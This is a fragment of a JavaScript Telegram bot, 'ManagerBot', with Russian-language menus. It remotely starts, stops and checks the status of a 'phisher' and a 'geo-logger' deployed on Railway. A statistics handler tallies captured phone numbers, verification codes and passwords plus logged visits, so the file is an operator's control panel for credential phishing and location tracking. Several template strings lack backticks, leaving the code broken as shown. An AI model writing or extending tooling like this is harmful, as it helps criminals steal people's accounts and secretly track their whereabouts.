const msg = result.success ? '⏹️ Фишер остановлен' : ❌ Ошибка: ${result.error};
  ctx.editMessageText(msg, fisherMenu);
});
bot.action('fisher_status', async (ctx) => {
  await ctx.answerCbQuery();
  const status = await getProjectStatus(FISHER_PROJECT_ID);
  ctx.editMessageText(📊 Фишер: ${status.online}\n📥 ${status.message}, fisherMenu);
});

// Гео-логгер
bot.action('geo_start', async (ctx) => {
  await ctx.answerCbQuery('Запуск...');
  const result = await manageRailwayProject(GEO_PROJECT_ID, 'start');
  const msg = result.success ? '✅ Гео-логгер запущен' : ❌ Ошибка: ${result.error};
  ctx.editMessageText(msg, geoMenu);
});
bot.action('geo_stop', async (ctx) => {
  await ctx.answerCbQuery('Остановка...');
  const result = await manageRailwayProject(GEO_PROJECT_ID, 'stop');
  const msg = result.success ? '⏹️ Гео-логгер остановлен' : ❌ Ошибка: ${result.error};
  ctx.editMessageText(msg, geoMenu);
});
bot.action('geo_status', async (ctx) => {
  await ctx.answerCbQuery();
  const status = await getProjectStatus(GEO_PROJECT_ID);
  ctx.editMessageText(📍 Гео-логгер: ${status.online}\n🌍 ${status.message}, geoMenu);
});

bot.action('collect_data', async (ctx) => {
  await ctx.answerCbQuery('Собираю данные...');
  const data = 📊 Статистика:\n\n🔐 Фишер:\n- Номеров: 0\n- Кодов: 0\n- Паролей: 0\n\n📍 Гео-логгер:\n- Визитов: 0\n- Последний: —;
  ctx.editMessageText(data, mainMenu);
});

bot.launch();
console.log('✅ ManagerBot запущен');
